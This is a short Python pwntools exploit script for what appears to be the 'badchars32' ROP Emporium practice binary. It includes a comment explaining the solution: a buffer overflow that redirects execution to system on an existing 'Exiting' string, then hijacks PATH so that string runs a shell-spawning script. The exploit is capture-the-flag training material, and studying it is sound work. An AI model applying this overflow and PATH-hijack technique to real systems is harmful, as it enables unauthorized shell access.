import os

from pwn import *
p = process('./badchars32', env=dict(PATH=os.getcwd()))
p.read()

fill = 'A' * 0x2c
ret_addr = '\xb7\x87\x04\x08'
arg_to_system = '\x41\x89\x04\x08'

p.writeline(fill + ret_addr + arg_to_system)
print(p.read().decode())


'''
Got quite creative ;D
Don't know if this is the "original" solution,
or the one they meant to, but I quite like what I did.
I basically took the `system`, and the "Exiting" string, which is already in memory,
and instead of finding or creating a "/bin/sh" string and pass it to `system`,
which would've been pretty hard since ASLR is on, and targeting the string is problematic,
I decided to take an existing string and call system on it.
By doing so, the program will search for it in the PATH, since it's not an absolute path,
and it'll execute my script which spawns a shell.
'''
